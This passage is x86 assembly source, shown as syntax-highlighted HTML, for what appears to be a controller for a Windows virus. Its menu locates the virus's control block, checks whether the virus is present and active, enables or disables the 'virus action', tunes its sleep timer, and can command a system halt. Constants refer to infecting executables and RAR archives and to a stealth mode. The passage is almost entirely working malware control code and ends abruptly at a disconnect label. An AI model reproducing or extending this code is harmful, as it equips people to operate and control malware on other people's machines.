        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_end_</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  
</span><span class="sc5">_end_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">                        </span><span class="sc1">;and quit</span><span class="sc0">

</span><span class="sc5">got_BGCB</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;we got address</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_hex</span><span class="sc0">   
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">HexWrite</span><span class="sc0">                           </span><span class="sc1">;convert number to string</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgOKSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgOK</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;and display address</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bAddress</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;EBX=address of BGCB</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Check4Presency</span><span class="sc0">                     </span><span class="sc1">;presency check</span><span class="sc0">

        </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">not_found</span><span class="sc4">&gt;</span><span class="sc0">         </span><span class="sc1">;Setup SEH frame</span><span class="sc0">
</span><span class="sc5">id_get</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgWaitSize</span><span class="sc0">                   
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgWait</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;print message</span><span class="sc0">
</span><span class="sc5">id_lbl</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DblGtChr</span><span class="sc0">                           </span><span class="sc1">;get char</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">             </span><span class="sc1">;presency check</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@pCheck</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'1'</span><span class="sc0">                             </span><span class="sc1">;state check</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@sCheck</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'2'</span><span class="sc0">             </span><span class="sc1">;disable virus action</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@dAction</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'3'</span><span class="sc0">             </span><span class="sc1">;enable virus action</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@eAction</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'4'</span><span class="sc0">             </span><span class="sc1">;get sleep time</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@gSleep</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'5'</span><span class="sc0">             </span><span class="sc1">;increase sleep time</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@iSleep</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'6'</span><span class="sc0">             </span><span class="sc1">;decrease sleep time</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@dSleep</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'7'</span><span class="sc0">                             </span><span class="sc1">;set sleep time unit</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@uSleep</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'8'</span><span class="sc0">             </span><span class="sc1">;system halt</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@sHalt</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'9'</span><span class="sc0">             </span><span class="sc1">;disconnect</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@disconnect</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">27</span><span class="sc0">              </span><span class="sc1">;ESC</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">end</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">id_lbl</span><span class="sc0">

</span><span class="sc5">@pCheck</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Check4Presency</span><span class="sc0">                     </span><span class="sc1">;presency check</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">id_get</span><span class="sc0">

</span><span class="sc5">@sCheck</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgActionSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgAction</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;print message</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;EAX=0</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;EAX=1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_ID</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;ID=1</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_New</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;load New item</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">;New=1</span><span class="sc0">
</span><span class="sc5">wait_loop4</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">;is it 1?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">wait_loop4</span><span class="sc0">                           </span><span class="sc1">;yeah, wait</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idIdle</span><span class="sc0">                  </span><span class="sc1">;load string</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgFOut</span><span class="sc4">+</span><span class="sc5">msgCOutSize</span><span class="sc0">     </span><span class="sc1">;destination place</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_Data</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;get Data item</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">n_action</span><span class="sc0">                          </span><span class="sc1">;is it 0 ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">BG_INFECTINEXEC</span><span class="sc0">                 </span><span class="sc1">;no, is it BG_INFECTINEXEC ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">i_rar</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">idSize</span><span class="sc0">                         </span><span class="sc1">;yeah, load string</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">n_action</span><span class="sc0">
</span><span class="sc5">i_rar</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">BG_INFECTINRAR</span><span class="sc0">                  </span><span class="sc1">;no, is it BG_INFECTINRAR ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">i_stlt</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">idSize</span><span class="sc0">                       </span><span class="sc1">;yeah, load string</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">n_action</span><span class="sc0">
</span><span class="sc5">i_stlt</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">BG_STEALTHIN</span><span class="sc0">                    </span><span class="sc1">;no, is it BG_STEALTHIN ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">i_error</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">*</span><span class="sc5">idSize</span><span class="sc0">                       </span><span class="sc1">;no, load string</span><span class="sc0">
</span><span class="sc5">n_action</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                                   </span><span class="sc1">;load byte</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">;store byte</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc0">                             </span><span class="sc1">;end of string reached ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">n_action</span><span class="sc0">                            </span><span class="sc1">;no, continue</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgFOutSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgFOut</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;print message</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">id_get</span><span class="sc0">
</span><span class="sc5">i_error</span><span class="sc4">:</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc5">idSize</span><span class="sc0">                       </span><span class="sc1">;load string</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">n_action</span><span class="sc0">

</span><span class="sc5">@dAction</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;disable virus action</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgDisableSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgDisable</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;print message</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DblGtChr</span><span class="sc0">                           </span><span class="sc1">;get char</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Y'</span><span class="sc0">                             </span><span class="sc1">;is it 'Y'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">DiSaBlE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'y'</span><span class="sc0">                             </span><span class="sc1">;is it 'y'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">id_get</span><span class="sc0">
</span><span class="sc5">DiSaBlE</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_ID</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;ID=2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_New</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;New=1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgDisabledSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgDisabled</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;print message</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">id_get</span><span class="sc0">

</span><span class="sc5">@eAction</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;enable virus action</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgEnableSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgEnable</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;print message</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DblGtChr</span><span class="sc0">                           </span><span class="sc1">;get char</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Y'</span><span class="sc0">                             </span><span class="sc1">;is it 'Y'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@EnAbLe</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'y'</span><span class="sc0">                             </span><span class="sc1">;is it 'y'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">id_get</span><span class="sc0">
</span><span class="sc5">@EnAbLe</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_ID</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">;ID=3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_New</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;New=1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgEnabledSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgEnabled</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;print message</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">id_get</span><span class="sc0">

</span><span class="sc5">@dSleep</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgDTimeSize</span><span class="sc0">                       </span><span class="sc1">;decrement sleep time</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgDTime</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;print message</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_ID</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">           </span><span class="sc1">;ID=6</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">isleep</span><span class="sc0">

</span><span class="sc5">@iSleep</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgITimeSize</span><span class="sc0">                       </span><span class="sc1">;increment sleep time</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgITime</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;print message</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_ID</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">           </span><span class="sc1">;ID=5</span><span class="sc0">
</span><span class="sc5">isleep</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sUnit</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;get unit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_Data</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;Data=unit</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_New</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;load address of New item</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">;New=1</span><span class="sc0">
</span><span class="sc5">wait_loop1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">;is New=1 ?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">wait_loop1</span><span class="sc0">                           </span><span class="sc1">;yeah, wait</span><span class="sc0">

</span><span class="sc5">@gSleep</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgGTimeSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgGTime</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;print message</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_ID</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">;ID=4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_New</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;New=1</span><span class="sc0">
</span><span class="sc5">wait_loop2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_New</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;is New=0 ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">wait_loop2</span><span class="sc0">                          </span><span class="sc1">;no, wait</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_Data</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;get Data item</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">curTime</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">HexWrite</span><span class="sc0">                           </span><span class="sc1">;convert it to string</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgGTime2Size</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgGTime2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;print message</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">id_get</span><span class="sc0">

</span><span class="sc5">@uSleep</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sUnit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">                        </span><span class="sc1">;set sleep time unit</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">thsnd</span><span class="sc0">                               </span><span class="sc1">;is it 100</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sUnit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">                       </span><span class="sc1">;yeah, set it to 1000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sUnitVal</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'0001'</span><span class="sc0">        </span><span class="sc1">;set string to '1000'</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">a_sleep</span><span class="sc0">
</span><span class="sc5">thsnd</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sUnit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">                        </span><span class="sc1">;no, change it to 100</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sUnitVal</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">' 001'</span><span class="sc0">        </span><span class="sc1">;set string to '100 '</span><span class="sc0">
</span><span class="sc5">a_sleep</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgSUnitSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgSUnit</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;print message</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">id_get</span><span class="sc0">

</span><span class="sc5">@sHalt</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgKillSize</span><span class="sc0">                        </span><span class="sc1">;system halt</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgKill</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;print message</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DblGtChr</span><span class="sc0">                           </span><span class="sc1">;get char</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Y'</span><span class="sc0">                             </span><span class="sc1">;is it 'Y'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">KiLlPc</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'y'</span><span class="sc0">                             </span><span class="sc1">;is it 'y'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">id_get</span><span class="sc0">
</span><span class="sc5">KiLlPc</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgKilledSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgKilled</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;print message</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_ID</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">           </span><span class="sc1">;ID=7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_New</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;New=1</span><span class="sc0">
</span><span class="sc5">k_end</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">k_end</span><span class="sc0">

</span><span class="sc5">@disconnect</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;disconnect</span><span class="sc0">
